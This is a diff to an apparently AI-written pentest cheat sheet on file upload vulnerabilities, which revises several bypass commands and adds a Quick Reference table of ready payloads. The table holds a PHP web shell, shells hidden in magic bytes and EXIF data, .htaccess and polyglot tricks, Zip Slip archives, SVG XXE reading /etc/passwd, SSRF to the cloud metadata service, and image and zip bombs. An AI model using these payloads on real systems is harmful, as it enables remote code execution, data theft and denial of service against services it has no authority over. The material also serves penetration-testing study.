@@ -4,7 +4,7 @@
 
 ## What is this?
 
-File upload endpoints that fail to validate file type, content, or name allow attackers to upload web shells for RCE, malicious files for client-side attacks (XSS/XXE), or DoS payloads. Goal: get server-side code execution, or escalate impact through secondary techniques (LFI+upload, polyglots, EXIF payloads).
+File upload endpoints that fail to validate file type, content, or name allow attackers to upload web shells for RCE, malicious files for client-side attacks (XSS/XXE), or DoS payloads. Goal: get server-side code execution, or escalate impact through secondary techniques (LFI+upload, polyglots, EXIF payloads). Pairs with [[File Inclusion]], [[Cross-Site Scripting (XSS)]], [[Server-Side Attacks]].
 
 ---
 
@@ -173,9 +173,11 @@ Server blocks specific extensions (`.php`, `.asp`, etc.) — try alternatives.
 
 ```bash
 .php .php2 .php3 .php4 .php5 .php6 .php7 .php8
-.pht .phar .phtm .phtml .phps .pgif .shtml
+.pht .phar .phtm .phtml .pgif .shtml
 .inc .pif .wbmp
 ```
+
+> [!warning] `.phps` is NOT an RCE bypass — on default configs it maps to the PHP **source-display** handler (shows highlighted source, doesn't execute). Drop it from exec attempts (keep it only for source disclosure). Which of the above actually execute depends on the server's `handler`/`AddType` config — confirm per target.
 
 ### ASP alternatives
 
@@ -248,8 +250,8 @@ shell.php[AAA...255 chars total].jpg
 
 ```bash
 # Generate a padded filename (255-char limit example)
-python3 -c "print('shell.php' + 'A'*241 + '.jpg')"
-# → shell.phpAAAAAAAAAAAAAAAA...AAAA.jpg  (255 chars)
+python3 -c "print('shell.php' + 'A'*242 + '.jpg')"
+# 'shell.php'(9) + 242 A's + '.jpg'(4) = 255 chars → OS truncates the '.jpg' off the end
 # Server validates "...AAAA.jpg", truncates on disk to "shell.phpAAAA..." → executes as PHP
 ```
 
@@ -564,9 +566,10 @@ If the application extracts zip/tar archives, filenames inside the archive can c
 
 ```bash
 # Create a malicious zip with path traversal filename
-# Method 1: evilarc (python tool)
-pip install evilarc
-evilarc shell.php -o zip -d 6 -p /var/www/html/
+# Method 1: evilarc (python script — git clone, not pip)
+git clone https://github.com/ptoomey3/evilarc
+# -o = target OS (unix/win), -d = traversal depth, -p = path prefix, -f = output archive
+python3 evilarc/evilarc.py shell.php -o unix -d 6 -p var/www/html/ -f evil.zip
 
 # Method 2: manual with Python
 python3 -c "
@@ -637,7 +640,8 @@ curl "http://target.com/uploads/exploit.jpg"
 ```bash
 # Pixel flooding — compressed image with huge dimensions
 # Creates a small file that decompresses to massive memory usage
-convert -size 0xffff0000 xc:white bomb.png
+# -size wants WxH (ImageMagick rejects 0xffff0000). 65500x65500 ≈ 12 GB decompressed:
+convert -size 65500x65500 xc:white bomb.png
 
 # Zip bomb — nested archives that expand to huge size
 # 42.zip = 42kb → 42 nested layers → 4.5 petabytes uncompressed
@@ -782,6 +786,30 @@ url=http://<collaborator-url>/test
 
 ---
 
+## Quick Reference
+
+| Goal | Payload / Command |
+|---|---|
+| Minimal PHP shell | `<?php system($_GET['cmd']); ?>` |
+| Blacklist bypass — alt extensions | `.pht .phar .phtm .phtml` (confirm handler config; `.phps` is source-display, not exec) |
+| Double extension | `shell.php.jpg` (executes on first ext) or `shell.jpg.php` |
+| Null byte truncation (legacy) | `shell.php%00.jpg` |
+| Fuzz extensions | `ffuf -u http://target.com/upload.php -X POST -F "file=@shell.FUZZ;type=image/jpeg" -w web-extensions.txt -mc 200` |
+| Content-Type bypass | Change `Content-Type: application/x-php` → `image/jpeg` in Burp |
+| MIME/magic-byte bypass | `printf '\xff\xd8\xff' > shell.php; echo '<?php system($_GET["cmd"]); ?>' >> shell.php` |
+| EXIF-embedded payload | `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg` |
+| .htaccess upload (Apache) | Upload `.htaccess` with `AddType application/x-httpd-php .jpg` |
+| Polyglot JPG+PHP | `cat real.jpg shell.php > polyglot.php` |
+| Discover upload path | `ffuf -u http://target.com/FUZZ/shell.php -w raft-medium-directories.txt -mc 200` |
+| LFI + upload chain | Upload `shell.php.jpg` → `?file=../uploads/shell.php.jpg&cmd=id` |
+| SVG XXE | `<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` |
+| Stored XSS via filename | `"><img src=x onerror=alert(window.origin)>.jpg` |
+| Zip Slip path traversal | `python3 evilarc/evilarc.py shell.php -o unix -d 6 -p var/www/html/ -f evil.zip` |
+| SSTI probe (post-upload template render) | `{{7*7}}` (Jinja2/Twig) or `${7*7}` (Freemarker/Mako) |
+| Upload-from-URL SSRF | `url=http://169.254.169.254/latest/meta-data/` |
+
+---
+
 *Created: 2026-03-02*
-*Updated: 2026-05-14*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-27*
+*Model: claude-sonnet-5*
